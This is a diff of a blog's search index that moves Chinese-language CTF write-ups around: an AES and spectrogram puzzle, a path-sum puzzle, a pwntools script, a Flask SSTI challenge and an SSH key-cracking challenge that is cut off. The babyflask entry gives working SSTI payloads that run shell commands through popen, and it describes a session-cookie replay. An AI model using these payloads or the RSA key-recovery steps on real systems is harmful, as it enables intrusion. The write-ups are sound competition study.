@@ -1876,119 +1876,6 @@ The CNAME xxx.com is not properly formatted. See https://help.github.com/article
       </tags>
   </entry>
   <entry>
-    <title>K3RN3LCTF2021 Writeup</title>
-    <url>/posts/3427623925/</url>
-    <content><![CDATA[<h1 id="3in1"><a href="#3in1" class="headerlink" title="3in1"></a>3in1</h1><p><em>Description</em><br><em>Like Nescafeeeee!</em></p>
-<p><em>Attachments</em></p>
-<p><em><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py</a></em></p>
-<hr>
-<p>分析代码,发现是AES加密,密钥为<code>hkey</code></p>
-<pre><code class="python">password = (&quot;abda&quot;)    
-hash_obj = SHA256.new(password.encode(&#39;utf-8&#39;))    
-hkey = hash_obj.digest()
-
-def decrypt(info):
-    cipher = AES.new(hkey, AES.MODE_ECB)
-    result = cipher.decrypt(info)
-    return result
-msg =  b&#39;\x1bkw\x00\x01#\x1dv\xd1\x1e\xfb\xba\xac_b\x02T\xfbZ\xca\xac8Y\\8@4\xba;\xe1\x11$\x19\xe8\x89t\t\xc8\xfd\x93\xd8-\xba\xaa\xbe\xf1\xa0\xab\x18\xa0\x12$\x9f\xdb\x08~\x81O\xf0y\xe9\xef\xc41\x1a$\x1cN3\xe8F\\\xef\xc1G\xeb\xdb\xa1\x93*F\x1b|\x1c\xec\xa3\x04\xbf\x8a\xd9\x16\xbc;\xd2\xaav6pWX\xc1\xc0o\xab\xd5V^\x1d\x11\xe4&#125;6\xa4\x1b\\G\xd4e\xc2mP\xdb\x9b\x9f\xb0Z\xf12&#39;
-
-print(decrypt(msg))
-</code></pre>
-<p>AES解密得到两个url,访问url得到文件<code>hint.txt</code>和<code>flag.wav</code></p>
-<pre><code class="python">b&#39;https://www.mediafire.com/file/oii1sm3oyt4tyjc/flag.wav/file\nhttps://www.mediafire.com/file/rgdww91os3we7eo/hint.txt/file&#39;
-</code></pre>
-<p>查看<code>hint.txt</code>,提示我们“图形或照片表示”</p>
-<pre><code>A graphic or photographic representation 
-</code></pre>
-<p>使用<a href="https://www.sonicvisualiser.org/download.html">Sonic Visualiser</a>打开<code>flag.wav</code>,点击<code>Layer</code>-&gt;<code>Add Spectrogram</code>,得到flag</p>
-<p><img data-src="/../../CTF/K3RN3LCTF2021/Crypto/images/image-20211119215941779.png" alt="image-20211119215941779"></p>
-<p><strong>flag:</strong><code>flag&#123;34sY_CH4LL3nGe_w1tH_3Xtr4_St3Ps&#125;</code></p>
-<h1 id="Progressive-Dynamite"><a href="#Progressive-Dynamite" class="headerlink" title="Progressive Dynamite"></a>Progressive Dynamite</h1><p>Find the minimal sum of numbers on a path from the top left corner to the bottom right corner. You can only go right or down in each move.</p>
-<p><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Progressive-Dynamite/challenge.txt">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Progressive-Dynamite/challenge.txt</a></p>
-<hr>
-<p>题目给了一个包含负整数的网格,要求我们找到一条从网格左上角元素到右下角元素的路径,使得路径上的数字总和最小.</p>
-<p>参照<a href="https://leetcode-cn.com/problems/minimum-path-sum/solution/zui-xiao-lu-jing-he-by-leetcode-solution/">Leetcode-最小路径和</a>,是一道典型的动态规划题,代码如下:</p>
-<pre><code class="python">from Crypto.Util.number import *
-from challenge import grid
-
-rows, columns = len(grid), len(grid[0])
-dp = [[0] * columns for _ in range(rows)]
-dp[0][0] = grid[0][0]
-for i in range(1, rows):
-    dp[i][0] = dp[i - 1][0] + grid[i][0]
-for j in range(1, columns):
-    dp[0][j] = dp[0][j - 1] + grid[0][j]
-for i in range(1, rows):
-    for j in range(1, columns):
-        dp[i][j] = min(dp[i - 1][j], dp[i][j - 1]) + grid[i][j]
-print(dp[rows - 1][columns - 1])
-print(long_to_bytes(dp[-1][-1]))
-</code></pre>
-<p><strong>flag:</strong><code>flag&#123;dyn4m1c_pr0gramm1ng_pr0!&#125;</code></p>
-<h1 id="Vieta-s-Poly"><a href="#Vieta-s-Poly" class="headerlink" title="Vieta&#39;s Poly"></a>Vieta&#39;s Poly</h1><p>Here&#39;s a pwntools tutorial challenge to get you warmed up!</p>
-<p>nc ctf.k3rn3l4rmy.com 2236</p>
-<p><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Vietas-Poly/template.py">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Vietas-Poly/template.py</a></p>
-<hr>
-<p>题目给了一个多项式,要求我们计算:</p>
-<ul>
-<li>根的和</li>
-<li>根的倒数的和</li>
-<li>根的平方的和</li>
-</ul>
-<p>解析出多项式系数,借助<code>numpy.poly1d</code>构造多项式,即可计算出根,进一步计算得到所需结果(需要保留两位小数)</p>
-<p>代码:</p>
-<pre><code class="python">from math import ceil
-from pwn import *
-import numpy as np
-
-context.log_level = &#39;debug&#39;
-conn = remote(&#39;ctf.k3rn3l4rmy.com&#39;, 2236)
-
-def get_input():
-    input = conn.recvline().strip().decode()
-    return input
-
-def parse(polynomial):
-    &#39;&#39;&#39;
-    TODO: Parse polynomial
-    For example, parse(&quot;x^3 + 2x^2 - x + 1&quot;) should return [1,2,-1,1]
-    &#39;&#39;&#39;
-    pattern = re.compile(r&quot;([-]?\d+?)x\^\d+&quot;)
-    ls = pattern.findall(polynomial.replace(&quot; &quot;,&#39;&#39;))
-    ls.insert(0, 1)
-    return list(map(int, ls))
-
-for _ in range(4):
-    get_input()
-for i in range(100):
-    type = get_input()
-    coeffs = parse(get_input())
-    ans = -1
-    Q = np.poly1d(coeffs, r=False)
-    xs = np.roots(Q)
-    if &#39;sum of the roots&#39; in type:
-        ans = xs.sum()
-    elif &#39;sum of the reciprocals of the roots&#39; in type:
-        ans = (1/xs).sum()
-    elif &#39;sum of the squares of the roots&#39; in type:
-        ans = np.power(xs,2).sum()
-    ans = ceil(round(ans.real,2))
-    conn.sendline(str(ans))
-    get_input()
-conn.interactive()
-</code></pre>
-<p><strong>flag:</strong><code>flag&#123;Viet4s_f0r_th3_win&#125;</code></p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>K3RN3LCTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>KillerQueenCTF2021 Writeup</title>
     <url>/posts/2621990551/</url>
     <content><![CDATA[<h1 id="Cloudsourcing"><a href="#Cloudsourcing" class="headerlink" title="Cloudsourcing"></a>Cloudsourcing</h1><p><em>Sourced in the cloud</em></p>
@@ -2280,6 +2167,119 @@ if(isset($_POST[&quot;notewrite&quot;])) &#123;
       </tags>
   </entry>
   <entry>
+    <title>K3RN3LCTF2021 Writeup</title>
+    <url>/posts/3427623925/</url>
+    <content><![CDATA[<h1 id="3in1"><a href="#3in1" class="headerlink" title="3in1"></a>3in1</h1><p><em>Description</em><br><em>Like Nescafeeeee!</em></p>
+<p><em>Attachments</em></p>
+<p><em><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py</a></em></p>
+<hr>
+<p>分析代码,发现是AES加密,密钥为<code>hkey</code></p>
+<pre><code class="python">password = (&quot;abda&quot;)    
+hash_obj = SHA256.new(password.encode(&#39;utf-8&#39;))    
+hkey = hash_obj.digest()
+
+def decrypt(info):
+    cipher = AES.new(hkey, AES.MODE_ECB)
+    result = cipher.decrypt(info)
+    return result
+msg =  b&#39;\x1bkw\x00\x01#\x1dv\xd1\x1e\xfb\xba\xac_b\x02T\xfbZ\xca\xac8Y\\8@4\xba;\xe1\x11$\x19\xe8\x89t\t\xc8\xfd\x93\xd8-\xba\xaa\xbe\xf1\xa0\xab\x18\xa0\x12$\x9f\xdb\x08~\x81O\xf0y\xe9\xef\xc41\x1a$\x1cN3\xe8F\\\xef\xc1G\xeb\xdb\xa1\x93*F\x1b|\x1c\xec\xa3\x04\xbf\x8a\xd9\x16\xbc;\xd2\xaav6pWX\xc1\xc0o\xab\xd5V^\x1d\x11\xe4&#125;6\xa4\x1b\\G\xd4e\xc2mP\xdb\x9b\x9f\xb0Z\xf12&#39;
+
+print(decrypt(msg))
+</code></pre>
+<p>AES解密得到两个url,访问url得到文件<code>hint.txt</code>和<code>flag.wav</code></p>
+<pre><code class="python">b&#39;https://www.mediafire.com/file/oii1sm3oyt4tyjc/flag.wav/file\nhttps://www.mediafire.com/file/rgdww91os3we7eo/hint.txt/file&#39;
+</code></pre>
+<p>查看<code>hint.txt</code>,提示我们“图形或照片表示”</p>
+<pre><code>A graphic or photographic representation 
+</code></pre>
+<p>使用<a href="https://www.sonicvisualiser.org/download.html">Sonic Visualiser</a>打开<code>flag.wav</code>,点击<code>Layer</code>-&gt;<code>Add Spectrogram</code>,得到flag</p>
+<p><img data-src="/../../CTF/K3RN3LCTF2021/Crypto/images/image-20211119215941779.png" alt="image-20211119215941779"></p>
+<p><strong>flag:</strong><code>flag&#123;34sY_CH4LL3nGe_w1tH_3Xtr4_St3Ps&#125;</code></p>
+<h1 id="Progressive-Dynamite"><a href="#Progressive-Dynamite" class="headerlink" title="Progressive Dynamite"></a>Progressive Dynamite</h1><p>Find the minimal sum of numbers on a path from the top left corner to the bottom right corner. You can only go right or down in each move.</p>
+<p><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Progressive-Dynamite/challenge.txt">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Progressive-Dynamite/challenge.txt</a></p>
+<hr>
+<p>题目给了一个包含负整数的网格,要求我们找到一条从网格左上角元素到右下角元素的路径,使得路径上的数字总和最小.</p>
+<p>参照<a href="https://leetcode-cn.com/problems/minimum-path-sum/solution/zui-xiao-lu-jing-he-by-leetcode-solution/">Leetcode-最小路径和</a>,是一道典型的动态规划题,代码如下:</p>
+<pre><code class="python">from Crypto.Util.number import *
+from challenge import grid
+
+rows, columns = len(grid), len(grid[0])
+dp = [[0] * columns for _ in range(rows)]
+dp[0][0] = grid[0][0]
+for i in range(1, rows):
+    dp[i][0] = dp[i - 1][0] + grid[i][0]
+for j in range(1, columns):
+    dp[0][j] = dp[0][j - 1] + grid[0][j]
+for i in range(1, rows):
+    for j in range(1, columns):
+        dp[i][j] = min(dp[i - 1][j], dp[i][j - 1]) + grid[i][j]
+print(dp[rows - 1][columns - 1])
+print(long_to_bytes(dp[-1][-1]))
+</code></pre>
+<p><strong>flag:</strong><code>flag&#123;dyn4m1c_pr0gramm1ng_pr0!&#125;</code></p>
+<h1 id="Vieta-s-Poly"><a href="#Vieta-s-Poly" class="headerlink" title="Vieta&#39;s Poly"></a>Vieta&#39;s Poly</h1><p>Here&#39;s a pwntools tutorial challenge to get you warmed up!</p>
+<p>nc ctf.k3rn3l4rmy.com 2236</p>
+<p><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Vietas-Poly/template.py">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Vietas-Poly/template.py</a></p>
+<hr>
+<p>题目给了一个多项式,要求我们计算:</p>
+<ul>
+<li>根的和</li>
+<li>根的倒数的和</li>
+<li>根的平方的和</li>
+</ul>
+<p>解析出多项式系数,借助<code>numpy.poly1d</code>构造多项式,即可计算出根,进一步计算得到所需结果(需要保留两位小数)</p>
+<p>代码:</p>
+<pre><code class="python">from math import ceil
+from pwn import *
+import numpy as np
+
+context.log_level = &#39;debug&#39;
+conn = remote(&#39;ctf.k3rn3l4rmy.com&#39;, 2236)
+
+def get_input():
+    input = conn.recvline().strip().decode()
+    return input
+
+def parse(polynomial):
+    &#39;&#39;&#39;
+    TODO: Parse polynomial
+    For example, parse(&quot;x^3 + 2x^2 - x + 1&quot;) should return [1,2,-1,1]
+    &#39;&#39;&#39;
+    pattern = re.compile(r&quot;([-]?\d+?)x\^\d+&quot;)
+    ls = pattern.findall(polynomial.replace(&quot; &quot;,&#39;&#39;))
+    ls.insert(0, 1)
+    return list(map(int, ls))
+
+for _ in range(4):
+    get_input()
+for i in range(100):
+    type = get_input()
+    coeffs = parse(get_input())
+    ans = -1
+    Q = np.poly1d(coeffs, r=False)
+    xs = np.roots(Q)
+    if &#39;sum of the roots&#39; in type:
+        ans = xs.sum()
+    elif &#39;sum of the reciprocals of the roots&#39; in type:
+        ans = (1/xs).sum()
+    elif &#39;sum of the squares of the roots&#39; in type:
+        ans = np.power(xs,2).sum()
+    ans = ceil(round(ans.real,2))
+    conn.sendline(str(ans))
+    get_input()
+conn.interactive()
+</code></pre>
+<p><strong>flag:</strong><code>flag&#123;Viet4s_f0r_th3_win&#125;</code></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>K3RN3LCTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>L2-3.名人堂与代金券</title>
     <url>/posts/45393/</url>
     <content><![CDATA[<h2 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h2><p>对于在中国大学MOOC(<a href="http://www.icourse163.org/">http://www.icourse163.org/</a>) 学习“数据结构”课程的学生，想要获得一张合格证书，总评成绩必须达到 60 分及以上，并且有另加福利：总评分在 [G, 100] 区间内者，可以得到 50 元 PAT 代金券；在 [60, G) 区间内者，可以得到 20 元PAT代金券。全国考点通用，一年有效。同时任课老师还会把总评成绩前 K 名的学生列入课程“名人堂”。本题就请你编写程序，帮助老师列出名人堂的学生，并统计一共发出了面值多少元的 PAT 代金券。</p>
@@ -2328,6 +2328,62 @@ ken@163.com 70
       <tags>
         <tag>ACM</tag>
         <tag>CCCC天梯赛</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>L3HCTF2021-个人能力认证 Writeup</title>
+    <url>/posts/98571386/</url>
+    <content><![CDATA[<h1 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h1><p><em><a href="http://123.60.19.253:10001/">http://123.60.19.253:10001</a></em></p>
+<hr>
+<p>分析给出的源文件,发现<code>/success</code>路由下的<code>name</code>存在SSTI漏洞.</p>
+<p>继续分析,<code>name</code>取自<code>session[&#39;name&#39;]</code>,用户登录时会自动创新用户和删除前一个同名用户的登录信息,那其实我们用注入的代码的作为用户名直接登录即可.</p>
+<pre><code class="python">template =  &#39;&#39;&#39;
+Congratulations, %s. You can get flag now!
+&#39;&#39;&#39; % name
+return render_template_string(template)
+</code></pre>
+<p>要想执行到上述代码,需要给flag投满8票(我们手里只有5票),注意到vote是存储在session中,<code>/vote</code>接口会校验<code>session</code>中保存的vote数量并减一,猜测这里可能存在session会话劫持.</p>
+<p>我们第一次登录时复制一下当前的<code>session</code>,然后给flag投票,等手里的票用光之后,再把第一次登录时复制的<code>seesion</code>粘贴进浏览器保存的Cookie中,我们的票又回来了.</p>
+<blockquote>
+<p>🤠登录后疯狂点击“投票”,也能投满8票;可能因为Server响应太慢,浏览器中保存的session还没来得及被更新,导致多个请求发起时共用一个session(即vote数量相等),session中保存的vote最终只会减一.</p>
+</blockquote>
+<img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/0.jpg" alt="image-20211114190032492" style="zoom:50%;" />
+
+<p>使用如下代码作为用户名登录,查看一下当前已加载模块</p>
+<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()&#125;&#125;
+</code></pre>
+<img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/1.jpg" alt="image-20211114182131940" style="zoom:50%;" />
+
+<p>人肉计数&#x2F;写个脚本,找到<code>os._wrap_close</code>模块所在的索引,借助于<code>popen</code>函数可以直接执行系统命令</p>
+<pre><code class="python">num = 0
+for i in a.split(&#39;, &#39;):
+    if &#39;os._wrap_close&#39; in i:
+        print(num)
+    num += 1
+</code></pre>
+<p>先<code>ls -a</code>一下,发现<code>config.py</code></p>
+<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -a').read()&#125;&#125;
+</code></pre>
+<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/2.png" alt="image-20211114183143814"><br>继续<code>cat</code>,没有在<code>config.py</code>中找到flag</p>
+<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat config.py').read()&#125;&#125;
+</code></pre>
+<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/3.png" alt="image-20211114183703433"></p>
+<p>用<code>ls -R /</code>找找,发现存在<code>/flag</code>文件</p>
+<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -R /').read()&#125;&#125;
+</code></pre>
+<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/4.jpg" alt="image-20211114183857713"><br>直接<code>cat /flag</code>即可</p>
+<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;
+</code></pre>
+<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/5.png" alt="image-20211114184236370"></p>
+<p><strong>flag:</strong><code>l3hsec&#123;emmMmMM_mm~mMMmm~~T&#125;</code></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>L3HCTF</tag>
+        <tag>个人能力认证</tag>
       </tags>
   </entry>
   <entry>
@@ -2533,62 +2589,6 @@ if(isset($_POST[&quot;notewrite&quot;]))
       <tags>
         <tag>CTF</tag>
         <tag>PBjarCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>L3HCTF2021-个人能力认证 Writeup</title>
-    <url>/posts/98571386/</url>
-    <content><![CDATA[<h1 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h1><p><em><a href="http://123.60.19.253:10001/">http://123.60.19.253:10001</a></em></p>
-<hr>
-<p>分析给出的源文件,发现<code>/success</code>路由下的<code>name</code>存在SSTI漏洞.</p>
-<p>继续分析,<code>name</code>取自<code>session[&#39;name&#39;]</code>,用户登录时会自动创新用户和删除前一个同名用户的登录信息,那其实我们用注入的代码的作为用户名直接登录即可.</p>
-<pre><code class="python">template =  &#39;&#39;&#39;
-Congratulations, %s. You can get flag now!
-&#39;&#39;&#39; % name
-return render_template_string(template)
-</code></pre>
-<p>要想执行到上述代码,需要给flag投满8票(我们手里只有5票),注意到vote是存储在session中,<code>/vote</code>接口会校验<code>session</code>中保存的vote数量并减一,猜测这里可能存在session会话劫持.</p>
-<p>我们第一次登录时复制一下当前的<code>session</code>,然后给flag投票,等手里的票用光之后,再把第一次登录时复制的<code>seesion</code>粘贴进浏览器保存的Cookie中,我们的票又回来了.</p>
-<blockquote>
-<p>🤠登录后疯狂点击“投票”,也能投满8票;可能因为Server响应太慢,浏览器中保存的session还没来得及被更新,导致多个请求发起时共用一个session(即vote数量相等),session中保存的vote最终只会减一.</p>
-</blockquote>
-<img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/0.jpg" alt="image-20211114190032492" style="zoom:50%;" />
-
-<p>使用如下代码作为用户名登录,查看一下当前已加载模块</p>
-<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()&#125;&#125;
-</code></pre>
-<img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/1.jpg" alt="image-20211114182131940" style="zoom:50%;" />
-
-<p>人肉计数&#x2F;写个脚本,找到<code>os._wrap_close</code>模块所在的索引,借助于<code>popen</code>函数可以直接执行系统命令</p>
-<pre><code class="python">num = 0
-for i in a.split(&#39;, &#39;):
-    if &#39;os._wrap_close&#39; in i:
-        print(num)
-    num += 1
-</code></pre>
-<p>先<code>ls -a</code>一下,发现<code>config.py</code></p>
-<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -a').read()&#125;&#125;
-</code></pre>
-<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/2.png" alt="image-20211114183143814"><br>继续<code>cat</code>,没有在<code>config.py</code>中找到flag</p>
-<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat config.py').read()&#125;&#125;
-</code></pre>
-<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/3.png" alt="image-20211114183703433"></p>
-<p>用<code>ls -R /</code>找找,发现存在<code>/flag</code>文件</p>
-<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -R /').read()&#125;&#125;
-</code></pre>
-<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/4.jpg" alt="image-20211114183857713"><br>直接<code>cat /flag</code>即可</p>
-<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;
-</code></pre>
-<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/5.png" alt="image-20211114184236370"></p>
-<p><strong>flag:</strong><code>l3hsec&#123;emmMmMM_mm~mMMmm~~T&#125;</code></p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>L3HCTF</tag>
-        <tag>个人能力认证</tag>
       </tags>
   </entry>
   <entry>
@@ -3127,151 +3127,6 @@ im.save(&#39;ans.png&#39;)
       </tags>
   </entry>
   <entry>
-    <title>TsukuCTF2021 Writeup</title>
-    <url>/posts/434189373/</url>
-    <content><![CDATA[<h1 id="CrackSSH"><a href="#CrackSSH" class="headerlink" title="CrackSSH!"></a>CrackSSH!</h1><p><em>調査対象のサーバーで使われている公開鍵を入手した。噂によると、この鍵には問題があるらしいが...。なんとかして侵入しなければ。</em><br><em>Target: frt.hongo.wide.ad.jp</em><br><em>Port: 30022</em></p>
-<hr>
-<p>题目中给了一个公钥:</p>
-<pre><code class="asciiarmor">ssh-rsa AAAAB3NzaC1yc2EAAACBAWKA1hYjuvhxiwCGKsG+nbLj/iYy6pRwkkka64J6L+VLPp4K3JVSREEzmztAWxjkhGOleol3vzDRqR2J+4nSVOI9FhJyiBdSgECmXJYojGVSU56bCMdcysEkKYVz5e0+xQAjZDrotpm+FT0VAdwdWuZM68zZY8DE9H2uo9daHCf/AAAAgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1aalXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQ== tsukushi@frt.hongo.wide.ad.jp
-</code></pre>
-<p>参考知乎(<a href="https://zhuanlan.zhihu.com/p/33949377">ssh-keygen生成的id_rsa文件的格式</a>)上的的一篇文章:</p>
-<p>首先,<code>awk &#39;&#123;print $2&#125;&#39; crackssh.pub | base64 -d | hexdump -C</code>,得到:</p>
-<pre><code class="assembly">00000000  00 00 00 07 73 73 68 2d  72 73 61 00 00 00 81 01  |....ssh-rsa.....|
-00000010  62 80 d6 16 23 ba f8 71  8b 00 86 2a c1 be 9d b2  |b...#..q...*....|
-00000020  e3 fe 26 32 ea 94 70 92  49 1a eb 82 7a 2f e5 4b  |..&amp;2..p.I...z/.K|
-00000030  3e 9e 0a dc 95 52 44 41  33 9b 3b 40 5b 18 e4 84  |&gt;....RDA3.;@[...|
-00000040  63 a5 7a 89 77 bf 30 d1  a9 1d 89 fb 89 d2 54 e2  |c.z.w.0.......T.|
-00000050  3d 16 12 72 88 17 52 80  40 a6 5c 96 28 8c 65 52  |=..r..R.@.\.(.eR|
-00000060  53 9e 9b 08 c7 5c ca c1  24 29 85 73 e5 ed 3e c5  |S....\..$).s..&gt;.|
-00000070  00 23 64 3a e8 b6 99 be  15 3d 15 01 dc 1d 5a e6  |.#d:.....=....Z.|
-00000080  4c eb cc d9 63 c0 c4 f4  7d ae a3 d7 5a 1c 27 ff  |L...c...&#125;...Z.&#39;.|
-00000090  00 00 00 81 02 01 f9 8f  ba 8e 6f 71 bc d8 9b 9d  |..........oq....|
-000000a0  92 c8 a0 0b c8 56 fd 46  7e 56 e3 43 90 28 2a 9e  |.....V.F~V.C.(*.|
-000000b0  76 c8 fa be de 74 6b d4  dd 5a 6a 55 e1 1d 5d 69  |v....tk..ZjU..]i|
-000000c0  5d cc 1a d7 2a da f3 5f  83 14 3b 2e e1 b7 69 3c  |]...*.._..;...i&lt;|
-000000d0  2e df db 9a 4b ae 20 59  29 a4 8d 4f b2 b4 fa c4  |....K. Y)..O....|
-000000e0  50 74 fe 74 88 16 98 8e  c1 76 0b 28 3c 1e 3a 1e  |Pt.t.....v.(&lt;.:.|
-000000f0  19 a5 d5 92 1d db 3b 0d  95 d9 6c 14 b1 4e 2a 12  |......;...l..N*.|
-00000100  bf 53 8c f6 cc ce b0 82  c6 41 43 40 f9 f0 3b 09  |.S.......AC@..;.|
-00000110  a2 59 03 3c 19                                    |.Y.&lt;.|
-00000115
-</code></pre>
-<ul>
-<li><p>前4个字节(00 00 00 07)表示接下来的数据块是7个字节,接下来7个字节的内容是73 73 68 2d 72 73 61,正好是<code>ssh-rsa</code>的ASCII码</p>
-</li>
-<li><p>接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到e的16进制</p>
-</li>
-<li><p>再接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到n的16进制</p>
-<pre><code class="shell">~$ echo &quot;$((16#00000081))&quot;
-129
-~$ N=$(awk &#39;&#123;print $2&#125;&#39; ~/.ssh/id_rsa.pub | base64 -d | hexdump -ve &#39;1/1 &quot;%.2x&quot;&#39;)
-~$ e=$&#123;N: 30:129*2&#125; &amp;&amp; echo $e
-0100010000020100e5f95a4428736b17d113d90b86eba7d9052ebec087c808fd3e5704a10b2df04638b309f0e7cae4b0cd5bcefbfae5c28f681edbedaf10e35c77201380f4d309b337c8e0c62e815a967d18c9a4642fb1ebc44ea3a4a75335d097135895a7604e1662c6df43d61212f389288f4e717e4e6ebec06ce1fc5b1d4c2c
-~$ n=$&#123;N: -129*2&#125; &amp;&amp; echo $n
-bf582bcc145ea7b5b398b0c51c06be2d367248f6c247653e928bb317a290d7e7a99c169999cf0dbc56f875948d236da894abf2c8b4aac54d5dcb2b6ac8bfb1f9d87416a94a46e70d3083811a0397dcc8abea0b7e1b88fd230f05fd5d45de5bdee21d535aea684749a5c576d8b6e96aa358175f8f7666f27e9729fab06e25ac8021
-</code></pre>
-</li>
-</ul>
-<blockquote>
-<p>官方的Writeup给了另一种做法,可以直接得到e和n的16进制表示形式</p>
-<pre><code class="shell">~$ ssh-keygen -f crackssh.pub -e -m pem | openssl asn1parse
-    0:d=0  hl=4 l= 264 cons: SEQUENCE          
-    4:d=1  hl=3 l= 129 prim: INTEGER  :0201F98FBA8E6F71BCD89B9D92C8A00BC856FD467E56E34390282A9E76C8FABEDE746BD4DD5A6A55E11D5D695DCC1AD72ADAF35F83143B2EE1B7693C2EDFDB9A4BAE205929A48D4FB2B4FAC45074FE748816988EC1760B283C1E3A1E19A5D5921DDB3B0D95D96C14B14E2A12BF538CF6CCCEB082C6414340F9F03B09A259033C19
-  136:d=1  hl=3 l= 129 prim: INTEGER  :016280D61623BAF8718B00862AC1BE9DB2E3FE2632EA947092491AEB827A2FE54B3E9E0ADC95524441339B3B405B18E48463A57A8977BF30D1A91D89FB89D254E23D1612728817528040A65C96288C6552539E9B08C75CCAC124298573E5ED3EC50023643AE8B699BE153D1501DC1D5AE64CEBCCD963C0C4F47DAEA3D75A1C27FF
-</code></pre>
-</blockquote>
-<p>使用<a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a>生成私钥,保存至<code>id_rsa</code></p>
-<pre><code class="shell">python RsaCtfTool.py -n 360925413365609656207284763303112593050686426607629131354843699618905677197872793512380288223361149508460688151102823348462592916817609977273908821217493993702786929282477487755465976082059834867631026295714550319202482180891845062064382568022072228888091051431136923983143306662931216184662445381040847666201 -e 248940659700671391171916045022225211367167934215525303038734152650593067612113589541083076628705613883775652505492831370527586438096113903892713520850387855997035509546247913887222055672708066391999421835495881798128330308530099218984443115901043292942963247939575084326452874538239309850357410618060448737279 --private
-</code></pre>
-<pre><code class="asciiarmor">-----BEGIN RSA PRIVATE KEY-----
-MIICOQIBAAKBgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1a
